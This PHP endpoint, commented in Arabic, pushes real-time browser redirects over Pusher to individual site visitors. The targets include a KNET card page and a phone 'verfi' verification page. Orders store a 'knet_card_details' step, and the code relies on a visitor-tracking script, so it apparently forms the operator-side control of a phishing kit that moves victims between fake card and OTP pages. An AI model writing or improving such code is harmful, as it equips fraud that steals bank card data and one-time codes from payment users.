<?php
/**
 * إرسال توجيه للعميل عبر Pusher:
 * - قناة redirect-user-{reservation_id} (KNET)
 * - قناة redirect-session-{channel_suffix} (جلسة المتصفح)
 */

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed'], JSON_UNESCAPED_UNICODE);
    exit;
}

require_once __DIR__ . '/vendor/autoload.php';

use Pusher\Pusher;

function farm_public_origin(): string
{
    $https = !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off';
    $scheme = $https ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/'));
    $dir = rtrim($dir, '/');
    if ($dir === '' || $dir === '.' || $dir === '/') {
        return $scheme . $host;
    }

    return $scheme . $host . $dir;
}

function farm_order_reservation_id(array $order): string
{
    if (!empty($order['pusher_reservation_id'])) {
        return preg_replace('/\D/', '', (string) $order['pusher_reservation_id']);
    }
    $flow = $order['flow_data'] ?? [];
    if (!is_array($flow)) {
        return '';
    }
    foreach ($flow as $entry) {
        if (!is_array($entry)) {
            continue;
        }
        if (($entry['step'] ?? '') !== 'knet_card_details') {
            continue;
        }
        $data = $entry['data'] ?? [];
        if (!is_array($data)) {
            continue;
        }
        $rid = $data['reservation_id'] ?? null;
        if ($rid !== null && $rid !== '') {
            return preg_replace('/\D/', '', (string) $rid);
        }
    }

    return '';
}

function farm_normalize_site_url(string $origin, string $input): ?string
{
    $input = trim($input);
    if ($input === '') {
        return null;
    }
    $p = parse_url($origin);
    $host = $p['host'] ?? '';
    if (preg_match('#^https?://#i', $input)) {
        $u = parse_url($input);
        if (($u['host'] ?? '') !== $host) {
            return null;
        }

        return $input;
    }
    $path = ltrim($input, '/');

    return rtrim($origin, '/') . '/' . $path;
}

function farm_load_session_channel_suffix(string $sessionId): ?string
{
    $file = __DIR__ . '/data/client_sessions.json';
    if (!is_file($file)) {
        return null;
    }
    $j = json_decode((string) file_get_contents($file), true);
    if (!is_array($j) || !isset($j['by_id'][$sessionId]) || !is_array($j['by_id'][$sessionId])) {
        return null;
    }
    $s = $j['by_id'][$sessionId]['channel_suffix'] ?? null;

    return is_string($s) && $s !== '' ? $s : null;
}

try {
    $cfgPath = __DIR__ . '/farm_pusher_config.php';
    if (!is_file($cfgPath)) {
        throw new Exception('ملف farm_pusher_config.php غير موجود');
    }
    $cfg = require $cfgPath;
    if (!is_array($cfg) || empty($cfg['key']) || empty($cfg['secret']) || empty($cfg['app_id'])) {
        throw new Exception('إعدادات Pusher ناقصة');
    }

    $body = json_decode(file_get_contents('php://input'), true) ?: [];
    $target = strtolower((string) ($body['target'] ?? 'reservation'));

    $origin = farm_public_origin();
    $pusher = new Pusher(
        (string) $cfg['key'],
        (string) $cfg['secret'],
        (string) $cfg['app_id'],
        [
            'cluster' => (string) ($cfg['cluster'] ?? 'ap2'),
            'useTLS' => true,
        ]
    );

    if ($target === 'session') {
        $sessionId = isset($body['session_id']) ? preg_replace('/[^\w\-\.]/', '', (string) $body['session_id']) : '';
        $redirectIn = isset($body['redirect_url']) ? trim((string) $body['redirect_url']) : '';
        $suffixIn = isset($body['channel_suffix']) ? strtolower(preg_replace('/[^a-f0-9]/', '', (string) $body['channel_suffix'])) : '';

        if ($sessionId === '' || strlen($sessionId) < 8) {
            throw new Exception('معرّف الجلسة ناقص');
        }
        $redirectUrl = farm_normalize_site_url($origin, $redirectIn);
        if ($redirectUrl === null) {
            throw new Exception('رابط التوجيه غير مسموح أو غير صالح (نفس الموقع فقط)');
        }

        $suffix = null;
        if ($suffixIn !== '' && strlen($suffixIn) === 16 && ctype_xdigit($suffixIn)) {
            $suffix = $suffixIn;
        } else {
            $suffix = farm_load_session_channel_suffix($sessionId);
        }
        if ($suffix === null || $suffix === '') {
            throw new Exception('قناة التوجيه غير معروفة — تأكد أن العميل فتح الموقع (سكربت التتبع) ثم أعد المحاولة');
        }
        $channel = 'redirect-session-' . $suffix;
        $pusher->trigger($channel, 'redirect-event', ['redirect_url' => $redirectUrl]);

        echo json_encode([
            'success' => true,
            'message' => 'تم إرسال التوجيه للجلسة',
            'channel' => $channel,
            'redirect_url' => $redirectUrl,
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }

    // ——— reservation + طلب ———
    $orderId = preg_replace('/\D/', '', (string) ($body['order_id'] ?? ''));
    $reservationIn = preg_replace('/\D/', '', (string) ($body['reservation_id'] ?? ''));
    $destination = strtolower(preg_replace('/[^a-z_]/', '', (string) ($body['destination'] ?? '')));

    if ($orderId === '' || $reservationIn === '') {
        throw new Exception('رقم الطلب أو رمز الجلسة (KNET) مفقود');
    }

    $ordersFile = __DIR__ . '/data/orders.json';
    if (!is_file($ordersFile)) {
        throw new Exception('لا توجد طلبات');
    }
    $orders = json_decode((string) file_get_contents($ordersFile), true);
    if (!is_array($orders)) {
        throw new Exception('ملف الطلبات تالف');
    }

    $order = null;
    foreach ($orders as $o) {
        if (is_array($o) && (string) ($o['id'] ?? '') === (string) $orderId) {
            $order = $o;
            break;
        }
    }
    if ($order === null) {
        throw new Exception('الطلب غير موجود');
    }

    $storedRid = farm_order_reservation_id($order);
    if ($storedRid === '' || $storedRid !== $reservationIn) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => 'رمز الجلسة لا يطابق هذا الطلب'], JSON_UNESCAPED_UNICODE);
        exit;
    }

    $pay = $order['payment'] ?? [];
    $total = isset($pay['total']) ? (string) $pay['total'] : '0';

    if ($destination === 'custom') {
        $redirectIn = isset($body['redirect_url']) ? trim((string) $body['redirect_url']) : '';
        $redirectUrl = farm_normalize_site_url($origin, $redirectIn);
        if ($redirectUrl === null) {
            throw new Exception('رابط التوجيه غير مسموح');
        }
    } elseif ($destination === 'ver') {
        $redirectUrl = $origin . '/verfi/verfi/phone/ver.php?' . http_build_query([
            'order_id' => $orderId,
            'reservation_id' => $reservationIn,
            'total' => $total,
        ]);
    } elseif ($destination === 'knet') {
        $redirectUrl = $origin . '/knet.php?' . http_build_query([
            'order_id' => $orderId,
            'total' => $total,
            'tickets' => '0',
        ]);
    } elseif ($destination === 'checkout') {
        $redirectUrl = $origin . '/checkout.html';
    } else {
        throw new Exception('وجهة غير معروفة');
    }

    $channel = 'redirect-user-' . $reservationIn;
    $pusher->trigger($channel, 'redirect-event', ['redirect_url' => $redirectUrl]);

    echo json_encode([
        'success' => true,
        'message' => 'تم إرسال التوجيه',
        'channel' => $channel,
        'redirect_url' => $redirectUrl,
    ], JSON_UNESCAPED_UNICODE);
} catch (Throwable $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
    ], JSON_UNESCAPED_UNICODE);
}
